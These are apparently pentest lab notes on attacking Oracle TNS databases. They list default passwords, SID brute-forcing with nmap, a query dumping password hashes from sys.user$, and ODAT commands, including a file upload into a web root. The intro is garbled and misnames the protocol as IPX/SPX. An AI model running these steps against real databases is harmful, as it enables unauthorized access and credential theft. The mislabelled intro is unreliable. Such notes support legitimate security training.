# Oracle TNS (Oracle Transparent Network Substrate)

[IPX/SPX] is a protocol used by Oracle databases for communication between clients and servers. It is often used in environments where Oracle databases are deployed.

[finger service] is a network service that allows users to query information about other users on a network. It can be used to gather information about users, such as their login names, home directories, and other details.

Can be remotely managed in Oracle 8i/9i but not in Oracle 10g and later versions.

# Default Configuration

- **Port**: 1521 (default port for Oracle TNS)
- only accepts connections from authenticated users 
- **Configuration File**: 
    - `listener.ora` (located in `$ORACLE_HOME/network/admin/`)
    - `tnsnames.ora` (also in `$ORACLE_HOME/network/admin/`)

- **Default Passwords**:
    - Oracle 9 -> 'CHANGE_ON_INSTALL'
    - Oracle 10 -> no default password set
    - Oracle DBSNMP -> 'dbsnmp'

# ODAT (Oracle Database Attack Tool)

``` bash 

git clone https://github.com/quentinhardy/odat.git

./odat.py all -s 10.129.204.235

```

# Scanning 

``` bash

nmap -sV -p 1521 <target_ip> --open

```

# Nmap - SID Bruteforcing

``` bash

sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

```

# SQLplus

``` bash

sqlplus <username>/<password>@<host>:<port>/<service_name> as sysdba

select table_name from all_tables;

select * from user_role_privs;

select name, password from sys.user$;

```

# Oracle RDBMS - File Upload

``` bash

./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

```

# Tools Setup

``` bash
[!bash!]$ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome

```







